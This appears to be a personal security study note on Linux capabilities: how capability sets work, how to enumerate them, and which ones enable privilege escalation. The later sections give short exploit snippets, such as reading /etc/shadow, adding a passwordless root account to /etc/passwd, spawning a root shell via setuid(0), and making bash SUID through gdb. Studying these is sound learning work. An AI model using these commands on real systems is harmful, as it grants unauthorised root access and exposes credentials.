---
created: 26-01-2026
tags:
  - Linux_PrivEsc
  - Linux
---
## Linux capabilities

### Why capabilities?

Initially, in classic Unix/Linux, process privileges were binary. A process could run as either:
- Privileged **root user** (full privileges; unrestricted access to all system resources)
- Unprivileged user (limited access)

To perform specific privileged tasks, an unprivileged process would temporarily escalate to **root** using `sudo` or by executing a SUID/SGID binary owned by root. But in this case, the process could perform **any operation** as root, beyond strictly what's needed. This creates a significant security risk: if an attacker compromises the binary or the process, they gain full root privileges. 

This is why Linux [`capabilities`](https://man7.org/linux/man-pages/man7/capabilities.7.html) were invented.
### Capabilities

Linux capabilities provide fine-grained control over privileged operations, splitting root privileges into 41 distinct permissions. Unlike complete root access, capabilities allow specific privileged operations without complete system control.

>**Linux capabilities** are discrete permissions that allow a process to perform specific privileged operations **without full root privileges**.

- Linux currently defines **41 different capabilities**, numbered from `0` to `40`.

>[!example]+
>Instead of running Nmap as root to perform an `-Ss` scan, you can grant the `nmap` binary the `CAP_NET_RAW` capability, which allows it to directly manipulate network packets.

- Display a table of Linux capabilities:

```bash
systemd-analyze capability
```

| Name                     | `#`  | Description                                                                                                                                                                                                                                                                                                    |
| ------------------------ | :--- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `CAP_CHOWN`              | `0`  | Make arbitrary changes to file UIDs and GIDs, i.e., changing file ownership ([`chown`](https://man7.org/linux/man-pages/man1/chown.1p.html)).                                                                                                                                                                  |
| `CAP_DAC_OVERRIDE`       | `1`  | Bypass file read, write, and execute permission checks.                                                                                                                                                                                                                                                        |
| `CAP_DAC_READ_SEARCH`    | `2`  | Bypass file read and directory search permission checks.                                                                                                                                                                                                                                                       |
| `CAP_FOWNER`             | `3`  | Bypass permission checks on operations that normally require the process's effective user ID (UID) to match the file's owner UID, i.e., **bypass permission checks on files you don't own**.                                                                                                                   |
| `CAP_FSETID`             | `4`  | Don't clear set-user-ID and set-group-ID mode bits when a file is modified.                                                                                                                                                                                                                                    |
| `CAP_KILL`               | `5`  | Bypass permission checks for sending signals.                                                                                                                                                                                                                                                                  |
| `CAP_SETGID`             | `6`  | Make arbitrary manipulations of process GIDs and supplementary GID lists.                                                                                                                                                                                                                                      |
| `CAP_SETUID`             | `7`  | Make arbitrary changes to process UIDs.                                                                                                                                                                                                                                                                        |
| `CAP_SETPCAP`            | `8`  | Grant/remove process capabilities.                                                                                                                                                                                                                                                                             |
| `CAP_LINUX_IMMUTABLE`    | `9`  | Set the immutable and append-only attributes of files (set the `FS_APPEND_FL` and `FS_IMMUTABLE_FL` inode flags).                                                                                                                                                                                              |
| `CAP_NET_BIND_SERVICE`   | `10` | Bind to privileged ports (port numbers less than `1024`).                                                                                                                                                                                                                                                      |
| `CAP_NET_BROADCAST`      | `11` | Send and receive broadcast packets.                                                                                                                                                                                                                                                                            |
| `CAP_NET_ADMIN`          | `12` | Perform various network-related operations, e.g., interface configuration, IP firewall administration, setting promiscuous mode, etc.                                                                                                                                                                          |
| `CAP_NET_RAW`            | `13` | Use `RAW` and `PACKET` sockets; bind to any address for transparent proxying.                                                                                                                                                                                                                                  |
| `CAP_IPC_LOCK`           | `14` | Lock memory segments in the IPC namespace ([`mlock`](https://man7.org/linux/man-pages/man2/mlock.2.html), [`mlockall`](https://man7.org/linux/man-pages/man3/mlockall.3p.html), [`mmap`](https://man7.org/linux/man-pages/man2/mmap.2.html), [`shmctl`](https://man7.org/linux/man-pages/man2/shmctl.2.html)). |
| `CAP_IPC_OWNER`          | `15` | Bypass permission checks for operations on System V IPC objects.                                                                                                                                                                                                                                               |
| `CAP_SYS_MODULE`         | `16` | Load and unload kernel modules.                                                                                                                                                                                                                                                                                |
| `CAP_SYS_RAWIO`          | `17` | Perform I/O port operations; perform a range of device-specific operations on other devices.                                                                                                                                                                                                                   |
| `CAP_SYS_CHROOT`         | `18` | Use [`chroot`](https://man7.org/linux/man-pages/man2/chroot.2.html) to change root directory.                                                                                                                                                                                                                  |
| `CAP_SYS_PTRACE`         | `19` | Trace arbitrary processes using `ptrace()`.                                                                                                                                                                                                                                                                    |
| `CAP_SYS_PACCT`          | `20` | Enable or disable process accounting (`acct()`).                                                                                                                                                                                                                                                               |
| `CAP_SYS_ADMIN`          | `21` | Perform a range of system administration tasks, including filesystem operations (e.g., `mount()`, `umount()`), system configuration (e.g., `sethostname()`), resource control, namespace operations (e.g., `setns()`), security and monitoring (e.g., `bpf()`).                                                |
| `CAP_SYS_BOOT`           | `22` | Reboot the system; load new kernels for later execution (`kexec_load`)                                                                                                                                                                                                                                         |
| `CAP_SYS_NICE`           | `23` | Adjust process scheduling priority.                                                                                                                                                                                                                                                                            |
| `CAP_SYS_RESOURCE`       | `24` | Override resource limits.                                                                                                                                                                                                                                                                                      |
| `CAP_SYS_TIME`           | `25` | Set system clock.                                                                                                                                                                                                                                                                                              |
| `CAP_SYS_TTY_CONFIG`     | `26` | Configure `tty` devices.                                                                                                                                                                                                                                                                                       |
| `CAP_MKNOD`              | `27` | Create special files using  [`mknod`](https://man7.org/linux/man-pages/man2/mknod.2.html).                                                                                                                                                                                                                     |
| `CAP_LEASE`              | `28` | Establish leases on arbitrary files ([`fcntl`](https://man7.org/linux/man-pages/man2/fcntl.2.html)).                                                                                                                                                                                                           |
| `CAP_AUDIT_WRITE`        | `29` | Write records to the kernel auditing log.                                                                                                                                                                                                                                                                      |
| `CAP_AUDIT_CONTROL`      | `30` | Control auditing and security-related events.<br>Enable/disable kernel auditing; change/retrieve auditing filter rules; retrieve auditing status.                                                                                                                                                              |
| `CAP_SETFCAP`            | `31` | Set arbitrary file capabilities.                                                                                                                                                                                                                                                                               |
| `CAP_MAC_OVERRIDE`       | `32` | Override Mandatory Access Control (MAC) policy. Implemented for Smack LSM.                                                                                                                                                                                                                                     |
| `CAP_MAC_ADMIN`          | `33` | Configure MAC policy. Implemented for Smack LSM.                                                                                                                                                                                                                                                               |
| `CAP_SYSLOG`             | `34` | Perform privileged `syslog` operations; view kernel addresses exposed via `/proc` and other interfaces, even when `kptr_restrict=1`.                                                                                                                                                                           |
| `CAP_WAKE_ALARM`         | `35` | Trigger something that will wake up the system.                                                                                                                                                                                                                                                                |
| `CAP_BLOCK_SUSPEND`      | `36` | Prevent system suspend.                                                                                                                                                                                                                                                                                        |
| `CAP_AUDIT_READ`         | `37` | Read the audit log via multicast netlink socket.                                                                                                                                                                                                                                                               |
| `CAP_PERFMON`            | `38` | Use performance monitoring mechanisms.                                                                                                                                                                                                                                                                         |
| `CAP_BPF`                | `39` | Employ privileged BPF (Berkeley Packet Filter) operations (creating BPF maps, loading BPF Type Format data, retrieving JITed code of BPF programs, etc.).                                                                                                                                                      |
| `CAP_CHECKPOINT_RESTORE` | `40` | Restore processes from a checkpoint.                                                                                                                                                                                                                                                                           |
>[!important] Normal processes need and have **zero** capabilities. Generally, capabilities are only needed for **system-level** tasks. Other operations are primarily controlled by traditional file permissions.

>[!note] Each file, process, and thread can be assigned different capabilities. 

### File vs. process capabilities

- **File capabilities** are attached to executable binaries and define what capabilities a process will inherit when that binary is executed. These are the capabilities you set with `setcap` and view with `getcap`.
- **Process (thread) capabilities** are the actual capabilities a running process has at any given moment. These can be viewed via `/proc/<PID>/status` or `getpcaps`.

File capabilities are static — they're stored on disk with the binary. Process capabilities are dynamic — they change as the process runs.

>[!note] A process can have capabilities even if the binary didn't have file capabilities (e.g., inherited from the parent process, or granted via ambient capabilities).
### Capability sets

Linux capabilities are divided into **sets**, which define _when_ and _how_ a capability can be used. There are **five process (thread) capability sets**:

- **Effective** (`CapEff`)
	- These are the capabilities the kernel checks _right now_ when the process performs an action.

- **Permitted** (`CapPrm`)
	- The maximum set of capabilities the process *could* theoretically use.
	- A capability can be present in `Permitted` but not `Effective`; in this case, the process has the *potential* to use it (such as by calling a specific function to raise it to Effective), but isn't using it yet.
	- It is also a limiting superset for the capabilities that may be added to the Inheritable set by a thread that does not have the **`CAP_SETPCAP`** capability in its effective set.

- **Bounding** (`CapBnd`)
	- This defines the absolute maximum capabilities a process or its children can _ever_ acquire. 
	- A capability outside this set can never be acquired.

- **Inheritable** (`CapInh`)
	- These capabilities can be preserved across `execve()` calls. This allows a privileged parent process to pass specific rights down to a child binary.
	- Inheritable capabilities of a parent process are added to the permitted set of a child process.
	- Generally, inheritable capabilities are **not preserved across `execve()` when running as a non-root user**, unlike ambient capabilities. 

- **Ambient** (`CapAmb`)
	- These capabilities are preserved across `execve()` calls of a non-privileged program.
	- No capability can ever be ambient if it is not both permitted and inheritable.
	- Ambient capabilities are automatically lowered if either of the corresponding permitted or inheritable capabilities is lowered.
	- Ambient capabilities are added to the permitted set and assigned to the effective set when `execve()` is called.

>[!important]+ File capability sets 
>File capabilities are divided into three sets: Permitted, Inheritable, Effective. No Ambient or Bounding sets.
>- The file's Permitted capabilities automatically become Permitted for the process (regardless of the process's Inheritable capabilities).
>- The file's Inheritable set is ANDed with the process's (thread's) Inheritable set to determine which Inheritable capabilities are enabled in the Permitted set of the process after `execve()`.
>- The file's Effective set is actually a single bit. If it's set, the program can actually use capabilities that end up in the Permitted set. If it's not set, then after `execve()`, none of the gained capabilities are effective. The process has then *available* but must explicitly enable them with `cap_set_proc()`. 
>
>To put is simply: for Inheritable and Permitted capabilities of an *executable file* to be Effective for the *process* after `execve()`, the Effective capability set of the *executable file* must be set to `1`.

### Assigning and removing file capabilities 

- Assign a capability to a file:

```bash
sudo setcap <capabilities> <file> 
```

```bash
sudo setcap cap_net_bind_service=ep /usr/local/bin/server
```

>[!note] The letters after the capabilities indicate the capability sets:
>- `e`: Effective
>- `i`: Inheritable
>- `p`: Permitted
>- `a`: Ambient
>- `b`:  Bounding
>The operators are as follows:
>- `=`: Sets the specified capabilities to the given sets; removes all others.
>- `+`: Adds the specified capabilities to the given sets; leaves all others unchanged.
>- `-`: Removes the specified capabilities from the given sets; leaves all others unchanged.

- Assign multiple capabilities to a file:

```bash
sudo setcap cap_net_raw,cap_net_admin=eip /usr/bin/tcpdump
```

- Remove all capabilities from a file:

```bash
sudo setcap -r /usr/bin/ping
```

>[!note] See [`setcap — man pages`](https://man.archlinux.org/man/setcap.8.en).
## Enumeration

- Find all files with capabilities:

```bash
getcap -r / 2>/dev/null
```

```bash
find / -type f -exec getcap {} + 2>/dev/null | grep -v "^$"`
```

>[!note] Running `getcap` as an unprivileged user generates tons of "Permission denied" errors that clutter output. Redirecting `stderr` to `/dev/null` keeps results clean.

>[!example]-
>```bash
>getcap -r / 2>/dev/null
>```
> 
> ```bash
> /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
> /usr/bin/traceroute6.iputils = cap_net_raw+ep
> /usr/bin/mtr-packet = cap_net_raw+ep
> /usr/bin/ping = cap_net_raw+ep
> /home/karen/vim = cap_setuid+ep
> /home/ubuntu/view = cap_setuid+ep
> ```
> - Capabilities of each binary are listed separated by commas (`cap_net_raw`, `cap_setuid`, etc.), and letters indicate the capability sets (`e` for effective, `p` for permitted).

>[!note]+ Capability set flags
> - `e` — Effective 
> - `p` — Permitted
> - `i` — Inheritable
> - `a` — Ambient
> - `b` — Bounding

- Get capabilities of a specific **executable file**:

```bash
getcap /usr/bin/ping
```

- Inspect capabilities of a specific **process** (by PID):

```bash
getpcaps <PID>
```

>[!note] See [`getpcaps — man`](https://man.archlinux.org/man/getpcaps.8.en).

- Capabilities of each process can be found in the `/proc/<PID>/status` file, in hexadecimal format (for all five capability sets):

```bash
cat /proc/<PID>/status | grep Cap
```

- Decode a capability bitmask (found in `/proc/<PID>/status`):

```bash
capsh --decode=xxxxxxxxxxxxxxxx
```

>[!example]-
> - `getpcaps`:
> 
> ```bash
> getpcaps $$
> ```
> 
> ```bash
> 23654: cap_wake_alarm=i
> ```
> 
> - `/proc/$$/status`:
> 
> ```bash
> cat /proc/$$/status | grep Cap
> ```
> 
> ```bash
> CapInh:	0000000800000000
> CapPrm:	0000000000000000
> CapEff:	0000000000000000
> CapBnd:	000001ffffffffff
> CapAmb:	0000000000000000
> ```
> 
> - Inherited capabilities:
> 
> ```bash
> capsh --decode=0000000800000000 # CapInh
> ```
> ```bash
> 0x0000000800000000=cap_wake_alarm
> ```
> 
> - Bounding capabilities:
> 
> ```bash
> capsh --decode=000001ffffffffff # CapBnd
> ```
> ```bash
> 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
> ```

- Check capabilities of your current shell:

```bash
capsh --print
```

>[!example]-
> 
> ```bash
> capsh --print
> ```
> 
> ```bash
> Current: cap_wake_alarm=i  
> Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,ca  
> p_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_  
> owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_ni  
> ce,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfca  
> p,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_  
> checkpoint_restore  
> Ambient set =  
> Current IAB: cap_wake_alarm  
> Securebits: 00/0x0/1'b0 (no-new-privs=0)  
> secure-noroot: no (unlocked)  
> secure-no-suid-fixup: no (unlocked)  
> secure-keep-caps: no (unlocked)  
> secure-no-ambient-raise: no (unlocked)  
> uid=1000(trigger) euid=1000(trigger)  
> gid=1000(trigger)  
> groups=998(wheel),1000(trigger)
> ```

When you discover a binary with a capability assigned, ask yourself:

- **What does this capability allow?**
	- What kernel permission check does it bypass?
	- Can it be used to read or write protected files, mount filesystems, manipulate I/O devices? Can it be used to elevate privileges?
- **What operations can the binary itself perform in combination with the capability?**
	- Can it read or write files? Execute commands?

>[!warning] Any capabilities assigned to a **programming language or command interpreter** (`python`, `perl`, `ruby`, `php`, `bash`, `vim`, etc.) are **high-risk** and worth further investigation.

>[!tip] See [`GTFOBins`](https://gtfobins.github.io/).

>[!note] It's worth checking the `Capabilities` section for the binary in [`GTFOBins`](https://gtfobins.github.io/) to search for known exploits. ![[GTFOBins_capabilities.png]]

## Capabilities relevant for privilege escalation

| Name                  | `#`  | Attack surface                                                                                                                                                                                                                                                  |
| --------------------- | :--- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `CAP_CHOWN`           | `0`  | Change file ownership ([`chown`](https://man7.org/linux/man-pages/man1/chown.1p.html)) — can take ownership of `/etc/passwd` or `/etc/shadow`.                                                                                                                  |
| `CAP_DAC_OVERRIDE`    | `1`  | Bypass file read, write, and execute permission checks — **read, write, and execute any file**.                                                                                                                                                                 |
| `CAP_DAC_READ_SEARCH` | `2`  | Bypass file read and directory search permission checks — **read any file** (e.g., `/etc/shadow`) and **search any directory**.                                                                                                                                 |
| `CAP_FOWNER`          | `3`  | Bypass permission checks on files you don't own — can use `chmod()`, ignore sticky bits on directories, set/modify extended attributes and ACLs, etc.                                                                                                           |
| `CAP_SETUID`          | `7`  | Change process UID to `0` (root) — **direct root access**.                                                                                                                                                                                                      |
| `CAP_SETPCAP`         | `8`  | Grant/remove process capabilities — **grant your process any capability**.                                                                                                                                                                                      |
| `CAP_SYS_MODULE`      | `16` | Load and unload kernel modules — **inject malicious kernel modules, such as rootkits and reverse shells**.                                                                                                                                                      |
| `CAP_SYS_PTRACE`      | `19` | Trace arbitrary processes using `ptrace()` — **can inject code into other processes**.                                                                                                                                                                          |
| `CAP_SYS_ADMIN`       | `21` | Perform a range of system administration tasks, including filesystem operations (e.g., `mount()`, `umount()`), system configuration (e.g., `sethostname()`), resource control, namespace operations (e.g., `setns()`), security and monitoring (e.g., `bpf()`). |
| `CAP_SYS_RAWIO`       | `17` | Perform I/O port operations — access hardware I/O ports directly (`iopl()`, `ioperm()`), access `/dev/mem`, `/dev/kmem`, and `/proc/kcore`, disk and storage commands, etc.                                                                                     |

>[!note] See [`Linux Capabilities — HackTricks`](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html).

### `CAP_CHOWN`

>[`CAP_CHOWN`](https://man.archlinux.org/man/capabilities.7.en#CAP_CHOWN) allows a process to bypass permission checks for changing file ownership (UID) and group ownership (GID).

- In standard Unix permissions, only root and the current owner of a file can change its ownership.
- With `CAP_CHOWN`, a process can "steal" any file on the system or assign ownership of sensitive system files to a low-privilege user.

>[!example]+ 
> If Python has `cap_chown+ep`, you can use the `os.chown` function:
> 
> ```Python
> import os
> os.chown("/etc/shadow", 1000, 1000) # set owner user and group
> print(open("/etc/shadow").read())
> ```
> 
> Here, Python runs as a user with UID `1000`, but the Python binary itself has the `CAP_CHOWN` capability. 
> - `os.chown("/etc/shadow", 1000, 1000)` changes the owner of the file from root to UID `1000` (the current user). 
> - `print(open("/etc/shadow").read())` reads `/etc/shadow` on behalf of UID `1000`, which is now the owner of the file, and outputs its content to the terminal.

### `CAP_DAC_OVERRIDE`

>[`CAP_DAC_OVERRIDE`](https://man.archlinux.org/man/capabilities.7.en#CAP_DAC_OVERRIDE) allows a process to bypass file read, write, and execute permission checks (DAC stands for Discretionary Access Control).

- This capability grants full read/write access to the entire filesystem, regardless of permission bits (even if files are mode `000`). You can directly modify `/etc/passwd`, `/etc/shadow`, or SSH keys.

>[!example]+
> If Python has `cap_dac_override+ep`:
> 
> ```Python
> with open('/etc/passwd', 'a') as file:
> 	file.write('root2::0:0:root:/root:/bin/bash')
> ```
> 
> - This appends the line `root2::0:0:root:/root:/bin/bash` to `/etc/passwd`, which creates a new root user (UID `0`) without a password. 
> - You can then log in with:
> 
> ```bash
> su - root2
> ```

>[!example]+
> If Vim, or any other file editor, has `cap_dac_override+ep`, you can modify arbitrary files:
> 
> ```bash
> vim /etc/shadow
> ```
### `CAP_DAC_READ_SEARCH`


>[`CAP_DAC_READ_SEARCH`](https://man.archlinux.org/man/capabilities.7.en#CAP_DAC_READ_SEARCH) allows a process to bypass file read permission checks and directory read and execute permission checks. 

- Although `CAP_DAC_READ_SEARCH` does not grant write access, it can be used to read sensitive files on the system.

>[!example]+ 
> If Python has `cap_dac_read_search+ep`:
> 
> ```Python
> import os
> print(open("/etc/shadow").read())
> ```

>[!example]+
> If `tar` has `cap_dac_read_search+ep`:
> 
> - Read the `/etc/shadow` file by creating an archive of it:
> 
> ```bash
> tar -czf /tmp/shadow_backup.tar.gz /etc/shadow 2>/dev/null
> ```
> 
> - Extract it to a location you control:
> 
> ```bash
> tar -xf /tmp/shadow_backup.tar.gz -C /tmp/
> ```
> 
> - Read the extracted file, a copy of `/etc/shadow`:
> 
> ```bash
> cat /tmp/etc/shadow
> ```

### `CAP_FOWNER`

>[`CAP_FOWNER`](https://man.archlinux.org/man/capabilities.7.en#CAP_FOWNER) bypasses permission checks for operations that require the process to be the owner of the file (or have appropriate capabilities).

- Operations `CAP_FOWNER` allows **on any file regardless of its ownership** include but are not limited to:
	- Changing file permissions using `chmod()`.
	- Setting inode flags (file attributes) using `ioctl()`. 
	- Setting ACLs (Access Control Lists).
	- Ignoring directory sticky bits (deleting files in directories with the sticky bit set).
	- Specifying `O_NOATIME` in `open()` and `fcntl()`.
- While you cannot directly _read_ a protected file with `CAP_FOWNER` (you still need read permissions), you can _change_ the permissions of a file to make it readable by everyone.

>[!example]+
> If Python has `cap_fowner+ep`:
> 
> ```Python
> import os
> # Change /etc/shadow to world-readable (rw-rw-rw-)
> os.chmod("/etc/shadow", 0o666)
> # Now we, as an unprivileged user, can read it because the permissions allow it
> print(open("/etc/shadow").read())
> ```
> 
> - `os.chmod("/etc/shadow", 0o666)` makes `/etc/shadow` world-readable (this operation is possible thanks to `cap_fowner`).
> - `print(open("/etc/shadow").read())` reads `/etc/shadow` and outputs its content to the terminal.

### `CAP_SETUID`

>[`CAP_SETUID`](https://man.archlinux.org/man/capabilities.7.en#CAP_SETUID) allows a process to arbitrarily change its user ID (UID), effective UID, and saved UID.

- `CAP_SETUID` effectively allows a process to run as **any user**, including root (UID `0`). Normally, only root can do that.

>[!example]+
> If Python has `cap_setuid+ep`:
> 
> ```Python
> import os
> os.setuid(0)
> os.system("/bin/bash")
> ```
> 
> - `os.setuid(0)` changes the current process UID to `root`.
> - `/bin/bash` is then executed as UID `0`, resulting in a root shell.

### `CAP_SETPCAP`

>[`CAP_SETPCAP`](https://man.archlinux.org/man/capabilities.7.en#CAP_SETPCAP) allows a process to add or remove capabilities from itself or other processes (**within limits defined by the bounding set**).

- `CAP_SETPCAP` doesn't directly grant root privileges, but can be used to assign a process or executable other powerful capabilities (e.g., `CAP_SYS_ADMIN` or `CAP_DAC_OVERRIDE`) that can in turn be used to escalate to root.
- You can also assign capabilities to the *Ambient* set so that any child process you spawn (like `/bin/bash`) will automatically have them.


>[!example]+
> If Python has `cap_setpcap+ep`:
> 
> ```Python
> import os
> import subprocess
> os.system("setcap cap_sys_admin+ep /usr/bin/python3")
> subprocess.call(["/usr/bin/python3"])
> ```
> 
> - `setcap cap_sys_admin+ep /usr/bin/python3` grants Python the ability to perform various administrative tasks that normally require root privileges — this is akin to making `python3` a SUID executable, but in the capabilities context.
> - `subprocess.call(["/usr/bin/python3"])` creates a new Python process, where the assigned capability is in effect.
> 
> You could also assign `cap_sys_admin` to `/bin/bash` or any other command interpreter, and then launch it:
> ```python
> os.system("setcap cap_sys_admin+ep /bin/bash")
> subprocess.call(["/bin/bash"])
> ```

### `CAP_SYS_MODULE`

>[`CAP_SYS_MODULE`](https://man.archlinux.org/man/capabilities.7.en#CAP_SYS_MODULE) allows a process to load and unload kernel modules.

- Kernel modules run in **kernel space**, and therefore have **full control over the system**.
- Loading a malicious kernel module results in **arbitrary kernel-level code execution**. This is effectively equivalent to full system compromise.

>[!example]+
>If [`insmod`](https://man.archlinux.org/man/insmod.8.en) has `cap_sys_module+ep`, you can load a pre-compiled `.ko` file:
>```bash
>insmod ./rootkit.ko
>```
>>[!note] See [[kernel_modules_and_rootkits]].
>

>[!note]+ This capability is extremely dangerous and rarely assigned intentionally outside of kernel management tools.

### `CAP_SYS_PTRACE`

>[`CAP_SYS_PTRACE`](https://man.archlinux.org/man/capabilities.7.en#CAP_SYS_PTRACE) allows a process to trace or debug arbitrary processes on the system, including processes owned by root.

- Normally, [`ptrace()`](https://man.archlinux.org/man/ptrace.2.en) is restricted. You can't attach to processes you don't own or that aren't children of your process. `CAP_SYS_PTRACE` removes this restriction.
- It allows the process to use `ptrace()` on arbitrary processes, even those owned by root, to **read and write process memory** and **control their execution**.

>[!note] See [`How I Hacked Play-with-Docker and Remotely Ran Code on the Host — Nimrod Stoler, CyberArk`](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) and [`Privilege Escalation by abusing SYS_PTRACE Linux Capability — Nishant Sharma, Medium`](https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc).

>[!example]+
> If [GDB](https://man.archlinux.org/man/gdb.1) (The GNU Debugger) has `cap_sys_ptrace+ep`, you can attach to a running root process:
> 
> ```bash
> gdb -p 1000
> ```
> 
> Inside GDB, you can call functions on behalf of the target process. If the target process is running as root, the functions will execute as root as well:
> 
> ```C
> (gdb) call system("chmod +s /bin/bash")
> ```

>[!tip] Sometimes you can discover credentials, such as passwords and API keys, by reading a process's memory.

### `CAP_SYS_ADMIN`

>[`CAP_SYS_ADMIN`](https://man.archlinux.org/man/capabilities.7.en#CAP_SYS_ADMIN) is a catch-all capability that grants a wide range of system administration privileges.

- `CAP_SYS_ADMIN` is often described as **"the new root"**.
- It allows a process to mount filesystems, configure networking (firewall, routes), manipulate namespaces, control swap space, and perform various device management tasks.
- In practice, `CAP_SYS_ADMIN` almost always leads to full system compromise.
- The most common exploit involves mounting a filesystem to bypass permissions (e.g., mounting the host disk inside a container or a loop device).

>[!example]+
> If Python has `cap_sys_admin+ep`:
> 
> ```Python
> import os
> os.makedirs("/mnt/mountpoint", exist_ok=True)
> os.system("mount -o remount,rw /dev/sda1 /mnt/mountpoint")
> os.system("cat /mnt/mountpoint/etc/shadow")
> ```
> 
> 
> - `os.makedirs("/mnt/mountpoint", exist_ok=True)` creates a new directory inside `/mnt` to use as a mount point.
> - `os.system("mount -o remount,rw /dev/sda1 /mnt/mountpoint")` mounts the main disk (`/dev/sda1`) to the newly created directory with read-write permissions.
> - Since you own `/mnt/mountpoint` (you created it), you can modify it, and therefore **modify any files mounted there — the whole root filesystem**.

### `CAP_SYS_RAWIO`

>[`CAP_SYS_RAWIO`](https://man.archlinux.org/man/capabilities.7.en#CAP_SYS_RAWIO) gives a process raw access to I/O ports and physical memory (`/dev/mem`, `/dev/kmem`, `/dev/port`).

- Access to `/dev/mem` allows reading and writing to physical RAM.
- A process with `CAP_SYS_RAWIO` can scan physical memory for user passwords, SSH keys, encryption keys, etc.

>[!example]+
> If Python has `cap_sys_rawio+ep`:
> 
> ```Python
> import os, sys
> 
> try:
>     # open physical memory
>     with open("/dev/mem", "rb") as f:
>         # read specific chunks (unsafe to read all)
>         # for example, read first 1MB looking for "root" or "ssh-rsa":
>         while True:
>             chunk = f.read(1024*1024) # 1MB chunk
>             if not chunk: break
>             if b"root:" in chunk or b"PRIVATE KEY" in chunk:
>                 print("Found interesting data in chunk!")
>                 # (Save logic here)
>                 break
> except PermissionError:
>     print("Permission denied (Check CONFIG_STRICT_DEVMEM kernel parameter)")
> except Exception as e:
>     print(f"Error: {e}")
> ```


## Resources and further reading

- [`capabilities — man pages`]([https://man7.org/linux/man-pages/man7/capabilities.7.html](https://man.archlinux.org/man/capabilities.7.en))
- [`getpcaps — man pages`](https://man.archlinux.org/man/getpcaps.8.en)
- [`Linux Capabilities and Seccomp — Red Hat Documentation`](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux_atomic_host/7/html/container_security_guide/linux_capabilities_and_seccomp#linux_capabilities_and_seccomp)
- [`Understanding Capabilities in Linux — blog.ploetzli.ch`](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [`Linux Capabilities — HackTricks`](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html)
- [`Container security fundamentals part 3: Capabilities`](https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-3/)
- [`Linux Capabilities — HackTricks`](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html)

- [`Excessive Capabilities — 0xn3va.gitbook.io`](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities)
- [`How I Hacked Play-with-Docker and Remotely Ran Code on the Host — Nimrod Stoler, CyberArk`](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)
- [`Privilege Escalation by abusing SYS_PTRACE Linux Capability — Nishant Sharma, Medium`](https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc)
